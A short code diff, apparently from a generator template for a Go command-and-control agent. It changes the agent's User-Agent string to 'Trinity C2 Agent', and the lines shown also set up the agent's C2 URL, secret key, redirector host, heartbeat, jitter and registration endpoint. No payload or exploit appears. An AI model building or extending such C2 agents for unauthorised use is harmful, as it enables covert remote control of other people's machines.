@@ -20,7 +20,7 @@ func New{AGENT_STRUCT_NAME}(agentID, secretKey, c2URL, redirectorHost string, re
 	agent := &{AGENT_STRUCT_NAME}{
 		{AGENT_C2_URL_FIELD}:               c2URL,
 		{AGENT_ID_FIELD}:             agentID,
-		{AGENT_HEADERS_FIELD}:             map[string]string{"User-Agent": "Go C2 Agent"},
+		{AGENT_HEADERS_FIELD}:             map[string]string{"User-Agent": "Trinity C2 Agent"},
 		{AGENT_HEARTBEAT_INTERVAL_FIELD}:   60,
 		{AGENT_JITTER_FIELD}:              0.2,
 		{AGENT_REGISTER_URI_FIELD}:         "/api/users/register",
